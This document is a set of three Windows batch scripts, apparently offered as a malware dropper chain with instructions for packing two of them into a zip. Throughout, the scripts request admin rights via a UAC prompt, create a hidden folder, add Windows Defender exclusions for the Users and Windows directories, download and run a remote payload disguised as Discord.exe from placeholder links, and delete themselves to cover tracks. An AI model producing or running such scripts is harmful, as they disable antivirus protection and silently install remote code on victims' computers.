:---------------------------------------------------------------------------------------------------------------------------:


@echo off

powershell -window hidden -command ""

    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0

cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "Anon"
attrib +h "Anon" /s /d
cd C:\Users\%USERNAME%\AppData\Local\Anon" 
Powershell -Command "Invoke-Webrequest '2 and 3 batch file.' -OutFile 1.zip"
tar -xf 1.zip
del 1.zip

start C:\Users\%USERNAME%\AppData\Local\Anon\1.bat"


:---------------------------------------------------------------------------------------------------------------------------:


save the 2 other bat files below in a zip and call it 1.zip


:---------------------------------------------------------------------------------------------------------------------------:


@echo off

powershell -window hidden -command ""

powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Windows

start C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"

del "%~f0" & exit


:---------------------------------------------------------------------------------------------------------------------------:


@echo off

powershell -window hidden -command ""

Powershell -Command "Invoke-Webrequest 'exec link' -OutFile Discord.zip"
tar -xf Discord.zip
del Discord.zip
start Discord.exe
attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Discord.exe" /s /d

del "%~f0" & exit


:---------------------------------------------------------------------------------------------------------------------------:
